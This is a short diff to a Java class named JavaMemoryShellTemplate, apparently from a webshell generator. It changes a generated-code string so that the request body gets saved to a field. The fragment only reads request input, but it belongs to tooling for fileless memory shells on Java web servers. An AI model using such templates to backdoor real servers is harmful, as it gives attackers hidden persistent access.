@@ -125,7 +125,7 @@ public class JavaMemoryShellTemplate extends JavaJspTemplate {
     }
 
     protected String requestInputStream() {
-        return "    byte[] buffer = new byte[102400];    java.io.ByteArrayOutputStream bufferStream = new java.io.ByteArrayOutputStream();    InputStream inputStream = getInputStream(request);    int read = 0;    while ((read = inputStream.read(buffer))>0){        bufferStream.write(buffer,0,read);    }    byte[] requestData = bufferStream.toByteArray();";
+        return "    byte[] buffer = new byte[102400];    java.io.ByteArrayOutputStream bufferStream = new java.io.ByteArrayOutputStream();    InputStream inputStream = getInputStream(request);    int read = 0;    while ((read = inputStream.read(buffer))>0){        bufferStream.write(buffer,0,read);    }    this.shellBodySaved = bufferStream.toByteArray();    byte[] requestData = this.shellBodySaved;";
     }
 
     protected String responsePrint(byte[] data) {
